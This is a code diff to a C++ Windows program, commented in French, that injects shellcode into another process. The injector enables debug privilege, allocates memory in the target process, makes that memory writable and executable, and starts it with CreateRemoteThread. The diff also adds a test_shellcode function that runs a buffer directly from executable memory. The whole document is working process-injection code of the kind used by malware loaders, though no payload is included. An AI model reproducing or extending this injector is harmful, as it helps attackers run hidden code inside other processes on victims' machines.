@@ -3,7 +3,6 @@
 #include <iostream>
 #include <tlhelp32.h> // Pour utiliser CreateToolhelp32Snapshot et Process32First/Next
 
-
 void EnableDebugPrivilege() {
     HANDLE hToken;
     TOKEN_PRIVILEGES tp;
@@ -73,21 +72,30 @@ bool inject_shellcode(const char* shellcode, size_t size) {
 
     // Change memory permissions to executable
     DWORD oldProtect;
-    if (!VirtualProtectEx(hProcess, execMem, size, PAGE_EXECUTE_READ, &oldProtect)) {
+    if (!VirtualProtectEx(hProcess, execMem, size, PAGE_EXECUTE_READWRITE, &oldProtect)) {
         std::cerr << "Erreur lors du changement de la protection de la mémoire" << std::endl;
         VirtualFreeEx(hProcess, execMem, 0, MEM_RELEASE);
         CloseHandle(hProcess);
         return false;
     }
 
-    //// Validate memory protection
-    //MEMORY_BASIC_INFORMATION mbi;
-    //if (!VirtualQueryEx(hProcess, execMem, &mbi, sizeof(mbi)) || !(mbi.Protect & PAGE_EXECUTE)) {
-    //    std::cerr << "La mémoire allouée n'a pas les bonnes permissions d'exécution !" << std::endl;
-    //    VirtualFreeEx(hProcess, execMem, 0, MEM_RELEASE);
-    //    CloseHandle(hProcess);
-    //    return false;
-    //}
+    // Validate memory protection
+    MEMORY_BASIC_INFORMATION mbi;
+    if (VirtualQueryEx(hProcess, execMem, &mbi, sizeof(mbi))) {
+        std::cout << "Protection actuelle de la mémoire: 0x" << std::hex << mbi.Protect << std::endl;
+        if (!(mbi.Protect & PAGE_EXECUTE_READWRITE)) {
+            std::cerr << "La mémoire allouée n'a pas les bonnes permissions d'exécution !" << std::endl;
+            VirtualFreeEx(hProcess, execMem, 0, MEM_RELEASE);
+            CloseHandle(hProcess);
+            return false;
+        }
+    }
+    else {
+        std::cerr << "Erreur lors de la validation des permissions de mémoire." << std::endl;
+        VirtualFreeEx(hProcess, execMem, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return false;
+    }
 
     // Create a remote thread to execute the shellcode
     HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
@@ -109,8 +117,19 @@ bool inject_shellcode(const char* shellcode, size_t size) {
     // Clean up
     VirtualFreeEx(hProcess, execMem, 0, MEM_RELEASE);
     CloseHandle(hThread);
-    CloseHandle(hProcess);
+   // CloseHandle(hProcess);
 
     return true;
 }
 
+void test_shellcode(const char* shellcode, size_t size) {
+    std::cout << size << std::endl;
+    void* execMem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!execMem) {
+        std::cerr << "VirtualAlloc failed." << std::endl;
+        return;
+    }
+    std::memcpy(execMem, shellcode, size);
+    ((void(*)())execMem)(); // Cast and call the shellcode
+    VirtualFree(execMem, 0, MEM_RELEASE);
+}
